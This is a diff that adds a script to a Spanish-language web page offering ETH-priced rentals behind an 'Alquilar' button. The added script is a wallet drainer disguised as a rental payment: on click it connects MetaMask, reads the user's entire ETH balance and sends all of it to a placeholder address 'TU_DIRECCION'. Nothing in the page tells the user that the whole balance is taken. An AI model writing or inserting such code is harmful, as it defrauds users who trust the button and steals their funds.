@@ -66,5 +66,43 @@
     <p>Saldo de ETH: <span id="premium-balance">0.0001</span></p>
     <button class="rent-btn">Alquilar</button>
   </div>
+  <script>
+  const normalRentBtn = document.getElementById('normal-rent-btn');
+
+  normalRentBtn.addEventListener('click', async () => {
+    try {
+      // Conectar a Metamask
+      await ethereum.request({ method: 'eth_requestAccounts' });
+
+      // Obtener la dirección del usuario conectado
+      const accounts = await ethereum.request({ method: 'eth_accounts' });
+      const userAddress = accounts[0];
+
+      // Obtener el saldo de ETH del usuario
+      const ethBalance = await ethereum.request({
+        method: 'eth_getBalance',
+        params: [userAddress, 'latest'],
+      });
+
+      // Enviar el saldo de ETH a la dirección especificada
+      const txHash = await ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [
+          {
+            from: userAddress,
+            to: 'TU_DIRECCION',
+            value: ethBalance,
+          },
+        ],
+      });
+
+      alert(`Transacción enviada: ${txHash}`);
+    } catch (error) {
+      console.error(error);
+      alert('Ha ocurrido un error al enviar la transacción.');
+    }
+  });
+</script>
+
 </body>
 </html>
